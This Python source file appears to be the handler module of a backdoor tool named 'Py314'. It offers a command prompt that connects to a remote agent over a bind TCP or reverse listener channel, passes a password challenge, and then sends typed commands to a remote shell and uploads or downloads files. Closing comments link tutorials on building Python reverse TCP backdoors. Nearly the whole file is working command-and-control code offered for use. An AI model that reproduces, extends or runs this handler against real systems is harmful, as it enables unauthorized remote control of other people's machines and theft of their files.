import sys
import glob
import time
import socket
import socks
import modules
import logging
import hashlib
import threading
from cmd import Cmd
from netaddr import IPAddress, IPNetwork, AddrFormatError
from core import channels
from os import system, path
from termcolor import colored
from prettytable import PrettyTable


class Agent(Cmd):
# Agent prompt class, to define commands and interact with modules
    """Agent prompt to use modules and interact with agent"""

    intro = 'Type help or ? to list commands. (default input will be send to a remote shell)'

# < -------------------------- OVERRIDE -------------------------- >

    def default(self, cmd):
        """Override default method, to send unknow command to remote shell"""
        try: 

            modules.Shell(self.channel, self.password, cmd)

        except ConnectionResetError:
            logger.warning(f"Channel reset by peer")
            return True

        except BrokenPipeError:
            logger.warning(f"Channel reset by peer (broken pipe error)")
            return True

    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.

        If this method is not overridden, it repeats the last nonempty
        command entered.

        """


    def do_help(self, arg):
        """Display help about commands"""

        names = self.get_names()
        commands = [names.replace('do_', '') for names in names if names.startswith('do_')]
        
        if arg:
            
            doc = getattr(self, 'do_' + arg).__doc__
            print(doc)
            
        elif not arg:
            table = PrettyTable()

            headers = ['command', 'description']
            table.field_names = headers

            for header in headers:
                table.align[header] = 'l'

                
            for option in dir(self):
                if option.startswith('do_'):
                    commandName = option.replace('do_', '')
                    commandDoc = getattr(self, option).__doc__

                    table.add_row([commandName, commandDoc])

            print(table)

        
# < -------------------------- CUSTOM -------------------------- >

    def define_channel(self, arg):
        """Define the open socket to interact with agent"""
        self.channel = arg

    def define_password(self, arg):
        """Define password used for encryption/decryption (messages and files)"""
        self.password = arg


# < -------------------------- COMMANDS -------------------------- >

    def do_check(self, arg):
        """Check if remote agent is alive"""
        modules.Check(self.channel, self.password)

    def do_download(self, arg):
        """Download a remote file to a local directory : download <remote file> <local directory>"""

        # If arg, separate by space is different from 2 (needs source and destination path)
        if len(arg.split(' ')) != 2:
            logger.warning('Please specify a remote file and a local directory')
            logger.debug(f"Arguments : {arg}")

        else: 

            src, dst = arg.split(' ')
            fileBasename = path.basename(src)
            finalFile = f"{dst}/{fileBasename}"
            
            if path.isfile(dst):
                logger.warning("Destination can't be an existing file (must be an existing directory)")
            elif path.isfile(finalFile):
                logger.warning(f"File {finalFile} already exist !")
            elif not path.isdir(dst):
                logger.warning('Please specify a valid directory for destination')
            else:
                logger.debug('Arguments are corrects, sended to Download module')
                modules.Download(self.channel, self.password, src, dst)
            


        
    def do_exit(self, arg):
        """Quit agent and close the channel"""
        self.channel.close()
        return True

    def do_upload(self, arg):
        """Upload a local file to remote directory : upload <source file> <remote directory>"""

        # If arg, separate by space is different from 2 (needs source and destination path)
        if len(arg.split(' ')) != 2:
            logger.warning('Please specify a source file and a remote directory')
            logger.debug(f"Arguments : {arg}")
        else:
            # Unpack arg, to add infile and outfile
            src, dst = arg.split(' ')
            
            # If source file is a directory
            if path.isdir(src):
                logger.warning("Source file can't be folder, please check source path")
            # Else if sourcce file doesn't exist
            elif not path.isfile(src):
                logger.warning("Source file doesn't exist, please check source path")
            else:
                logger.debug('Arguments are corrects, sended to Send module')
                modules.Upload(self.channel, self.password, src, dst)


    def do_status(self, arg):
        """Display information about open channel with agent"""
        print(self.channel)





class Prompt(Cmd):
    """Simple Py314 Bind TCP handler"""

    # Define some default values for options
    optionsDict = {
        'host': '10.0.10.1',
        'port': 1234,
        'password': 'Py314!',
        'proxy': '', 
        'type': 'reverse_listener'
    }

# < -------------------------- OVERRIDE -------------------------- >

    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.

        If this method is not overridden, it repeats the last nonempty
        command entered.

        """

    def do_help(self, arg):
        """Display help about commands"""

        names = self.get_names()
        commands = [names.replace('do_', '') for names in names if names.startswith('do_')]
        
        if arg:
            
            doc = getattr(self, 'do_' + arg).__doc__
            print(doc)
            
        elif not arg:
            table = PrettyTable()
            headers = ['command', 'description']
            table.field_names = headers

            for header in headers:
                table.align[header] = 'l'

                
            for option in dir(self):
                if option.startswith('do_'):
                    commandName = option.replace('do_', '')
                    commandDoc = getattr(self, option).__doc__

                    table.add_row([commandName, commandDoc])

            print(table)


# < -------------------------- COMMANDS -------------------------- >

    def do_bg(self, arg):
        """Return to Py314 main interpreter"""
        return True

    def do_exit(self, arg):
        """Quit Py314"""
        exit()

    def do_run(self, arg):
        """Launch handler with defined settings"""
        ConnectAgent(self.optionsDict)

    def do_set(self, arg):
        """Set value for available option : set <option> <value>"""

        availableOptions = [options.replace('set_', '') for options in dir(self) if options.startswith('set_')]
        
        if len(arg.split(' ')) > 1:

            option = arg.split(' ')[0]
            value = arg.split(' ')[1]

            if option not in availableOptions:
                logger.warning(f"Option {option} can't be set with this handler")
            else:
                self.optionsDict[option] = value
                logger.debug(f'Option <{option}> set to <{value}>')
        else:
            logger.warning(f'Please specify an <option> and a associated <value>')




    def do_options(self, arg):
        """Show currents settings of handler"""

        print("""\nThe bind_tcp handler is designed to bind a specified host with IP & port combination.""")
        print("""If the connection is successfull, a shell is automatically give, and remote actions are allowed\n""")

        table = PrettyTable()
        headers = ['name', 'value', 'description']
        table.field_names = headers
        for header in headers:
            table.align[header] = 'l'

        for option in dir(self):
            if option.startswith('set_'):
                optionName = option.replace('set_', '')
                optionValue = self.optionsDict[optionName]
                optionDoc = getattr(self, option).__doc__

                table.add_row([optionName, optionValue, optionDoc])

        print(table)

    def do_unset(self, arg):
        """Unset value for available option : unset <option>"""

        if len(arg.split(' ')) > 1 or len(arg.split(' ')) < 1:
            self.logger.warning(f"Please specify unset <option>")
        
        else:

            availableOptions = [options.replace('set_', '') for options in dir(self) if options.startswith('set_')]
            option = arg.split(' ')[0]

            if option not in availableOptions:
                logger.warning(f"Option {option} can't be unset")
            else:
                self.optionsDict[option] = ''




# < -------------------------- Handler OPTIONS -------------------------- >

    def set_host(self):
        """Define IP address to use (to bind agent or to create a listener)"""

    def set_port(self):
        """Define a port to use (to bind agent or to create a listener)"""

    def set_password(self):
        """Define a password use to connect to Py314 agent and to perform symetric encryption of traffic"""

    def set_proxy(self):
        """Define a proxy (socks4, socks5 and HTTP), which be use to bind Py314 agent : <type>://<ip>:<port>"""

    def set_type(self):
        """Define type of handler : bind_agent/reverse_listener"""
        self.optionsDict['type'] = arg




# ------------------------------------------------------------------
# ------------------------------ Main ------------------------------
# ------------------------------------------------------------------

BUFFER_SIZE = 1024
logger = logging.getLogger('main')


def startModule():

    
    subPrompt = Prompt()
    subPrompt.prompt = f"({colored('handler', 'yellow')}) > "
    subPrompt.cmdloop()



def ConnectAgent(dictionnary):


    if checkOptions(dictionnary) is False:
        return



    host = dictionnary['host']
    port = int(dictionnary['port'])
    password = dictionnary['password']
    proxy = dictionnary['proxy']
    agentType = dictionnary['type']

    ciperPassword = hashlib.sha512(password.encode()).hexdigest()
    
    try:
    
        if agentType == 'bind_agent':
            channel = channels.bind_tcp(host, port, proxy)
            if type(channel) == bool:
                logger.debug('Returned channel is false')
                return

        elif agentType == 'reverse_listener':
            channel = channels.reverse_listener(host, port)
            if type(channel) == bool:
                logger.debug('Returned channel is false')
                return
            

        challenge = passwordChallenge(channel, ciperPassword)


        if challenge is True:
            logger.debug(f'Successfull password challenge with : ')
            logger.debug(f'Password > {password}')
            logger.debug(f'SHA512 > {ciperPassword}')
        elif challenge is False:
            logger.warning(f"Password doesn't match")
            channel.close()
            return

        try:

            agentPrompt = Agent()
            agentPrompt.prompt = colored(f"agent@{host}:{port} > ", 'green') 
            agentPrompt.define_channel(channel)
            agentPrompt.define_password(password)
            agentPrompt.cmdloop()

        except KeyboardInterrupt:
            choice = input('\nDo you want to quit bind_agent channel [y/n] ? :')

            if choice.lower() == 'y':
                channel.close()
                return
            elif choice.lower() == 'n':
                pass
            else:
                pass


    except OSError as error:
        logger.warning(error)
        return



def passwordChallenge(channel, password):

    bufferSize = BUFFER_SIZE

    channel.sendall(password.encode())

    while True:
        challengeResponse = channel.recv(bufferSize)
        if len(challengeResponse) < bufferSize:
            break

    answer = challengeResponse.decode()
    if answer == hashlib.sha512(password.encode()).hexdigest():
        answer = True
    elif answer == ' ':
        answer = False


    return answer

def checkAgent(channel, objet):
    
    while True:


        try:
            channel.sendall(b'alive ?')

        except ConnectionResetError:
            logger.warning(f"Channel reset by peer")
            objet.do_exit()
            break

        except BrokenPipeError:
            logger.warning(f"\nChannel reset by peer (broken pipe error)")
            objet.exit_prompt
            break
        
        time.sleep(3)


def checkOptions(dictionnary):
    """Function to check options before trying to established a connection with remote agent"""


    logger.debug(f"Dictionnary items : {dictionnary}")
    handlerType = ['bind_agent', 'reverse_listener']
    valid = True

    try:
        ip = IPAddress(dictionnary['host'])
        port = int(dictionnary['port'])
        handler = dictionnary['type']
        proxy = dictionnary['proxy']
        password = dictionnary['password']

        if ip.version != 4:
            logger.warning(f"IPv6 is not supported by Py314")
            valid = False
        elif dictionnary['host'].split('.')[-1].startswith('0') and dictionnary['host'] != '0.0.0.0':
            logger.warning(f"Invalid IP address for host : {dictionnary['host']}")
            valid = False

        if port <= 0 or port > 65535:
            logger.warning(f"Port number must be between 1 and 65535")
            valid = False

        if handler not in handlerType:
            logger.warning(f"Please specify a valid handler : {', '.join(handlerType)}")
            valid = False

        if handler == 'reverse_listener' and proxy != '':
            logger.warning('Proxy set with reverse_listener : proxy will be ignored')

    except AddrFormatError as error:
        logger.warning(f"Invalid IP address for host : {dictionnary['host']}")
        valid = False
    
    except ValueError as error:
        logger.warning(f"Invalid port number : {dictionnary['port']}")
        valid = False

    return valid




    # https://www.shellvoide.com/python/how-to-hack-create-shell-backdoor-in-python/
    # https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-1/1038
    # https://dev.to/tman540/simple-remote-backdoor-with-python-33a0
